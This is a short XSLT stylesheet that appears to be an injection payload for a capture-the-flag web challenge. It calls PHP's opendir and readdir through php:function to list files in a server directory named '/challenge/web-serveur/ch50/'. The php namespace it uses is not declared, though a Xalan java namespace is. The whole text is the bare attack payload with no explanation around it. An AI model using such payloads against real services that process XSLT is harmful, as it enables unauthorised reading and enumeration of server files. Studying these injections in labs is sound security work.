<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:java="http://xml.apache.org/xalan/java">

  <xsl:template match="s">
<xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/')"/>
<xsl:value-of select="php:function('readdir')"/>
  </xsl:template>

</xsl:stylesheet>
